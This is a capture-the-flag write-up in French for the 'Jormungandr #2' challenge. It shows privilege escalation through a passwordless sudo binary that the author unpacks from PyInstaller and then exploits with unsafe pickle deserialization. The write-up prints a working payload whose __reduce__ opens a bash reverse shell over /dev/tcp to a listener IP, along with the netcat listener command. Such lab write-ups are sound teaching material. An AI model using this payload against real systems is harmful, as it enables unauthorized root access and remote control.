# Jormungandr #2

## Contexte
- **Nom du challenge** : Jormungandr #2
- **Catégorie** : Reverse / Privilege Escalation
- **Difficulté** : Medium
- **Objectif** : lire le fichier `/root/root.txt`, ce qui nécessite les droits **root**.
- **Point de départ** : reverse shell en tant qu'utilisateur `jormungandr`
  (obtenu à la fin du challenge *Jormungandr*).

---

## 1. Découverte du privilège sudo

Depuis le reverse shell obtenu en tant que `jormungandr` :

```bash
sudo -l
```

```
User jormungandr may run the following commands on <host>:
    (root) NOPASSWD: /opt/ragnarok/ragnarok
```

`jormungandr` peut exécuter **`/opt/ragnarok/ragnarok` en root, sans mot de passe**.

---

## 2. Récupération du binaire sur la machine locale

Avant de pouvoir le reverser, je récupère le binaire `/opt/ragnarok/ragnarok` sur ma
machine, depuis un terminal local (pas depuis le reverse shell) avec `scp` :

```bash
scp fenrir@<host>:/opt/ragnarok/ragnarok ./
```

Ça fonctionne car l'utilisateur (`fenrir`/`jormungandr`) a le droit de **lecture** sur ce
fichier, même s'il ne peut l'**exécuter en root** que via l'entrée `sudo NOPASSWD`.
`scp` copie le fichier tel quel (binaire brut) via le protocole SSH/SFTP, en utilisant
les identifiants `fenrir` récupérés précédemment (challenge *Jormungandr* / `.yggdrasil.cache`).

---

## 3. Reverse de `ragnarok`

Ce binaire n'est pas un simple `.pyc` mais un **exécutable PyInstaller**. J'extrais le bytecode embarqué :

```bash
python pyinstxtractor.py ragnarok
```

L'extraction révèle que c'est compilé pour **Python 3.5** :

```bash
uncompyle6 ragnarok_extracted/ragnarok.pyc
```

Le code source obtenu montre :

```python
data = base64.b64decode(entered)
meal = pickle.loads(data)
```

→ le programme **désérialise en pickle l'input utilisateur, sans validation**. Combiné au
`sudo NOPASSWD`, c'est une **RCE en root via désérialisation pickle**.

---

## 4. Exploitation pickle → root

Je construis un objet malveillant utilisant `__reduce__` — la méthode que pickle appelle
pour savoir comment reconstruire cet objet, détournée pour lui faire appeler
`os.system(commande)` au lieu d'un vrai constructeur. Le payload est sérialisé
(`pickle.dumps`) puis encodé en base64 (car le service fait `base64.b64decode` avant
`pickle.loads`) :

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        cmd = "bash -i >& /dev/tcp/10.8.0.246/4444 0>&1"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

Le payload est envoyé comme réponse au prompt `meal:` du binaire, lancé **via sudo** :

```bash
sudo /opt/ragnarok/ragnarok
# meal: <payload base64>
```

Avec un listener `nc -lvnp 4444`, la désérialisation exécute le reverse shell **en root** :

```bash
cat /root/root.txt
```

→ **accès root complet** et **flag `root.txt` obtenu**.

---

## Outils utilisés
- `sudo` — exécution du binaire en root
- `pyinstxtractor.py` — extraction d'un exécutable PyInstaller
- `uncompyle6` — décompilation de bytecode Python 3.5
- `python` (`pickle`, `os`, `base64`) — construction du payload de désérialisation
- `nc` (netcat) — listener du reverse shell root

## Techniques utilisées
- **Reverse engineering** d'un exécutable PyInstaller (extraction + décompilation)
- Identification d'une **désérialisation pickle non validée**
- **RCE via désérialisation pickle** (`__reduce__` → `os.system`)
- **Privilege escalation via sudo** mal configuré (`NOPASSWD`) → shell root
